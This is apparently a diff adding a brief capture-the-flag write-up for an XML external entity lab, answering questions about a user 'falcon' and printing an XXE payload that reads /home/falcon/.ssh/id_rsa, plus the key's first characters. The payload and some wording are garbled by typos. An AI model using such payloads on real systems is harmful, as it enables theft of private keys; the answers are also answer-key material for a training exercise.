@@ -1,0 +1,15 @@
+Deploy the machine & stard
+
+Q1)What is the name of the user in /etc/passwd
+~Center the command given the previous task , we get "falcon ".
+
+Q2)Where is falcon's SSH key located?
+The key is located in:
+/home/falcon/.ssh/id_rsa
+
+Q3)What are the first 18 characters for falcon's private key
+<?xml version="1.0"?>
+<!DOCTYPE root [<I ENTITY read SYSTEM
+file:///home/falcon/.ssh/id_rsa'>/> 
+<root> & read :</root>
+Ans:MIIEogIBAAKCAQEA7
